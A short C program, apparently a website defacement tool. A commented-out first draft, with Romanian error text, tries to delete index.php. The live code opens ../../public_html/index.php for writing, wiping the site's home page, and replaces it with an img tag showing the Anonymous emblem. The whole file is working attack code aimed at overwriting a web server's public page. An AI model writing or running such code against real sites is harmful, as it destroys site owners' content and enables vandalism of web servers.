/*#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
int
main (void)
{
  FILE *f=fopen("./index.php","r");
  if(!f){
      puts("Eroare");
  }
  /*int x=remove("./index.php");
  printf("%d",x);
  return 0;
}
*/
#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
int
main (void)
{

  FILE *f=fopen("../../public_html/index.php","w");
  fprintf(f,"<img width=\'500\' src=\'https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/2000px-Anonymous_emblem.svg.png\'>");

  return 0;
}